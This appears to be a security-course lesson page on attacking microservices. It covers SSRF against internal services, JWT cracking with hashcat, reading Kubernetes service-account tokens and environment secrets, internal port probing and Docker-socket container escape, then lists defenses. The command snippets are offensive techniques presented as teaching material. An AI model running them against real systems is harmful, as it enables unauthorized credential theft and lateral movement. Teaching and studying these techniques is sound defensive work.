---
title: "Hacking Microservices"
topic: "hacking-microservices"
tags: [microservices, api, docker, kubernetes, service-mesh, jwt, ssrf, container]
difficulty: advanced
day: 52
layout: default
parent: Topics
nav_order: 52
---

# Hacking Microservices

## What You Will Learn
- How microservice architectures work and why they have unique attack surfaces
- Common vulnerabilities in microservice environments
- How to attack service-to-service communication
- How to escalate from one service to others

## What Is It?

A **microservice architecture** breaks an application into many small, independent services. Each service handles one specific function (user management, payments, notifications) and communicates with others via APIs — typically REST, gRPC, or message queues.

This is a common architecture for large-scale applications (Netflix, Uber, Amazon all use it).

## Why It Matters

Microservices multiply the attack surface. Instead of one monolithic app, you have dozens of services each with their own:
- API endpoints
- Authentication mechanisms
- Data storage
- Secrets and configuration

A vulnerability in one service can be a stepping stone to others through internal trust relationships.

## Key Concepts

### Common Vulnerabilities

| Vulnerability | Description |
|--------------|-------------|
| **SSRF** | Service A makes a request on attacker's behalf to internal Service B |
| **JWT Flaws** | Weak JWT signing, algorithm confusion (`none` algorithm) |
| **Broken Auth** | Service-to-service calls with no authentication |
| **Insecure Secrets** | API keys, DB credentials in environment variables or config maps |
| **Container Escape** | Break out of one container to access others |

### SSRF in Microservices

A Server-Side Request Forgery (SSRF) is especially dangerous in microservices because internal services often trust each other without authentication.

```
Attacker → Public API (Service A)
         → Crafted request: URL = http://payment-service/internal/refund
         → Service A forwards request to payment-service
         → Payment service executes refund without auth check
```

Example request:

```http
POST /api/fetch HTTP/1.1
Content-Type: application/json

{"url": "http://payment.internal/admin/add-credits?user=attacker&amount=1000"}
```

### JWT Attacks

Many microservices use JWTs for service-to-service authentication.

```bash
# Decode a JWT
echo "eyJhbGc..." | cut -d. -f2 | base64 -d

# Common attacks:
# 1. "alg: none" — strip signature
# 2. RS256 to HS256 confusion — sign with public key
# 3. Weak secret brute force
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

### Kubernetes Secrets

```bash
# If you have access to a container, check for secrets
env | grep -i "key\|pass\|secret\|token"
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use service account token to query Kubernetes API
curl -k https://kubernetes.default.svc/api/v1/namespaces \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

### Internal Service Discovery

```bash
# From a compromised container, probe internal services
for port in 80 443 8080 8443 3000 5000; do
    curl -s -o /dev/null -w "%{http_code} $port\n" http://payment-service:$port/
done

# DNS discovery of other services
nslookup payment-service
curl http://payment-service/health
```

### Docker API Exposure

```bash
# If the Docker socket is mounted in a container
ls -la /var/run/docker.sock

# Escape the container
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

## Defense

- **Mutual TLS (mTLS)**: Every service authenticates to every other service with certificates
- **Service mesh** (Istio, Linkerd): Handles mTLS, authorization policies, observability
- **Least privilege**: Services only have access to what they need
- **Secrets management**: Use Vault, AWS Secrets Manager, or Kubernetes secrets (not env vars)
- **Network policies**: Restrict which pods can communicate with each other

## Resources

- [HackTricks — Kubernetes Pentesting](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security)
- [Microservice Security (OWASP)](https://owasp.org/www-project-api-security/)
- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [Bishop Fox — Attacking Microservices](https://bishopfox.com/blog/microservices-architecture-attacks)
